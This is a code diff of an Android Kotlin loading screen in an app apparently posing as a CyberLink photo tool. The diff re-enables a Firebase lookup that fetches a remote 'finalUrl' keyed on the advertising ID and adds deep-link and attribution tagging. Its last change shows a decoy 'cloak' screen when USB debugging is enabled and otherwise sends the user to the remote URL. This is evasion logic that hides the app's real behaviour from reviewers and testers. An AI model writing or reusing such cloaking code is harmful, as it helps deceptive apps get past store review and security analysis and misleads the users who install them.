@@ -9,7 +9,7 @@ import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.ViewModelProvider
 import androidx.lifecycle.lifecycleScope
-import com.cyberlink.photodirecto.App
+import com.cyberlink.photodirecto.MyApp
 import com.cyberlink.photodirecto.databinding.LoadingActivityBinding
 import com.cyberlink.photodirecto.ui.activities.cloak.CloakActivity
 import com.cyberlink.photodirecto.ui.intents.AppsIntent
@@ -19,7 +19,6 @@ import com.cyberlink.photodirecto.ui.states.DeepLinkState
 import com.cyberlink.photodirecto.util.CustomDatabase
 import com.cyberlink.photodirecto.util.UrlMaker
 import com.cyberlink.photodirecto.viewmodel.MyViewModel
-import com.cyberlink.photodirecto.viewmodel.MyViewModelFactory
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 
@@ -35,28 +34,24 @@ class LoadingActivity : AppCompatActivity() {
         setContentView(binding.root)
 
         initViewModel()
-        viewModel.handleDeppIntent()
-        viewModel.handleDataIntent()
+        viewModel.handleDeppIntent(this@LoadingActivity)
+        viewModel.handleDataIntent(this@LoadingActivity)
         observeDeepState()
         observeDataState()
-        imitateDeepIntent()
-//        lifecycleScope.launch(Dispatchers.IO) {
-//
-//            val user = firebase.getData(App.adID)
-//
-//
-//            Log.d("custom", "firebase url - $user")
-//
-//            lifecycleScope.launch(Dispatchers.Main) {
-//                user.let {
-//                    if (user == null) {
-//                        imitateDeepIntent()
-//                    } else {
-//                        checkSecurity(user.finalUrl!!)
-//                    }
-//                }
-//            }
-//        }
+//        imitateDeepIntent()
+        lifecycleScope.launch(Dispatchers.IO) {
+            val user = firebase.getData(MyApp.adID)
+            Log.d("custom", "firebase url - $user")
+            lifecycleScope.launch(Dispatchers.Main) {
+                user.let {
+                    if (user == null) {
+                        imitateDeepIntent()
+                    } else {
+                        checkSecurity(user.finalUrl!!)
+                    }
+                }
+            }
+        }
     }
 
     private fun imitateDeepIntent() {
@@ -67,12 +62,7 @@ class LoadingActivity : AppCompatActivity() {
     }
 
     private fun initViewModel() {
-        viewModel =
-            ViewModelProvider(
-                this,
-                MyViewModelFactory(App(), this@LoadingActivity)
-            )[MyViewModel::class.java]
-        Log.d("customTage", "view-model Init")
+        viewModel = ViewModelProvider(this)[MyViewModel::class.java]
     }
 
     private fun observeDeepState() {
@@ -98,6 +88,7 @@ class LoadingActivity : AppCompatActivity() {
                                     this@LoadingActivity
                                 )
                             )
+                            viewModel.makeTag(it.deepLink, null)
                             Log.d("customTage", "state deep")
                         } else {
                             viewModel.dataIntent.send(AppsIntent.FetchAppsData)
@@ -118,13 +109,16 @@ class LoadingActivity : AppCompatActivity() {
             viewModel.dataState.collect {
                 when (it) {
                     is AppsState.Idle -> {
-
+                        Log.d("customTage", "data state idle")
                     }
                     is AppsState.Loading -> {
                         binding.progressBar.visibility = View.VISIBLE
+                        Log.d("customTage", "data state loading")
                     }
                     is AppsState.Data -> {
+                        Log.d("customTagVM", "$it data state Data")
                         checkSecurity(urlMaker.buildUrl("null", it.data, this@LoadingActivity))
+                        viewModel.makeTag("null", it.data)
                     }
                     is AppsState.Error -> {
                         binding.progressBar.visibility = View.GONE
@@ -140,7 +134,7 @@ class LoadingActivity : AppCompatActivity() {
         if (Settings.Global.getString(
                 this@LoadingActivity.contentResolver,
                 Settings.Global.ADB_ENABLED
-            ) != "1"
+            ) == "1"
         ) {
             cloakStart()
         } else {
